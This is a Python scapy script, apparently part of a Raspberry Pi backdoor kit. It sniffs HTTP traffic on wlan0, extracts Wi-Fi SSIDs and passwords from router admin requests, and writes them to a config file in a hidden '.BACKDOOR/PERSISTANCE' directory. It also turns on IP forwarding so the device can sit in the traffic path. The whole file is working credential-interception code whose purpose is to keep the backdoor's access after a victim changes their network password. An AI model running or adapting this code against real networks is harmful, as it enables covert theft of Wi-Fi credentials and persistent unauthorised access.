#!/usr/bin/env python3
from scapy.all import *
from scapy.layers import http
import time
import os

FILE_CONFIG="/home/pi/.BACKDOOR/PERSISTANCE/CONFIG.txt"
FILE_CONFIG_BACKUP="/home/pi/.BACKDOOR/PERSISTANCE/CONFIG.txt.bak"
os.system('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')

def EDIT_CONFIG(PARAM,VAL):
	with open(FILE_CONFIG, mode='r') as f:
		confdata=f.read().split(':')
	with open(FILE_CONFIG, mode='w') as f:
		if PARAM == 0:
			confdata[0]=VAL
		if PARAM == 1:
			confdata[1]=VAL
		if PARAM == 2:
			confdata[2]=VAL
		if PARAM == 3:
			confdata[3]=VAL
		if PARAM == 4:
			confdata[4]=VAL
		if PARAM == 5:
			confdata[5]=VAL
		f.write(confdata[0]+':'+confdata[1]+':'+confdata[2]+':'+confdata[3]+':'+confdata[4]+':'+confdata[5])

def GET_PACKETS(x):
	try:
		if x.haslayer(http.HTTPRequest):
			http_data = str(x[http.HTTPRequest].Path.decode("utf-8"))
			print(http_data)
			# CONFIGURATION APRÉS RESET
			if "ssid_ap" in http_data:
				os.system('clear')
				data=str(x[http.HTTPRequest].Path.decode("utf-8"))
				data = data[2:-1].split('&')
				SSID = (data[8][8:])
				PASSWORD = (data[50][10:])
				EDIT_CONFIG(1,SSID)
				EDIT_CONFIG(2,PASSWORD)
				print("NEW CONFIG DETECTED:\nSSID="+SSID+" \nPASS="+PASSWORD)
			# MODIFICATION DU MOT DE PASSE
			if "pskSecret" in http_data and not "ssid_ap" in http_data and "Save" in http_data:
				os.system('clear')
				data=str(x[http.HTTPRequest].Path.decode("utf-8"))
				data = data[2:-1].split('&')
				PASSWORD = (data[3][10:])
				print("NEW PASSWORD DETECTED --> "+PASSWORD)
				EDIT_CONFIG(2,PASSWORD)
				print("NEW PASSWORD DETECTED --> "+PASSWORD)
			# MODIFICATION DU MOT DE PASSE
			if "ssid1" in http_data and "Save" in http_data:
				os.system('clear')
				data=str(x[http.HTTPRequest].Path.decode("utf-8"))
				data = data[2:-1].split('&')
				SSID = (data[1][6:])
				print("NEW SSID DETECTED --> "+SSID)
				EDIT_CONFIG(1,SSID)
				
	except:
		pass

print('[+] SNIFFER STARTED...........................[OK]')
sniff(iface="wlan0", prn=GET_PACKETS,filter="tcp port 80")
